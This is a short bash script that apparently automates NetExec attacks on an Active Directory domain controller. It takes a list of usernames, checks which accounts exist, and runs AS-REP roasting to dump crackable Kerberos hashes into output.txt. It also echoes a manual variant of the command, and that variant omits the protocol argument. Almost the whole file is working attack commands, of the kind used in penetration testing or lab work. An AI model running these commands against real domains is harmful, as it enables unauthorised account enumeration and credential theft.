#!/bin/bash

#  Check if the correct number of arguments are provided
if [ "$#" -ne 2 ]; then
    echo "Usage: bash script.sh <DC_IPADDRESS> <USERFILE>"
    exit 1
fi

# Assign command-line arguments to variables
ipaddress=$1
userfile=$2

# 1. Test if an Account Exists without Kerberos
echo " "
echo "1. Test if an Account Exists without Kerberos"
echo "nxc ldap $ipaddress -u $userfile -p ''  -k"
nxc ldap "$ipaddress" -u "$userfile" -p '' -k
echo " "
echo "======================================================"
echo " "
# 2. Tries to test if the there can be any asreproast
echo " "
echo "2. Tries to test if the there can be any asreproast"
echo "ldap $ipaddress -u $userfile -p '' --asreproast output.txt"
nxc ldap "$ipaddress" -u "$userfile" -p '' --asreproast output.txt
echo " "
echo "======================================================"
echo " "
# 3. If you do not have any user list, you can run below command manually

echo " "
echo "3. If you do not have any user list, you can run below command manually "
echo "nxc $ipaddress -u username -p '' --asreproast output.txt"

echo " "
echo "======================================================"
echo "END"
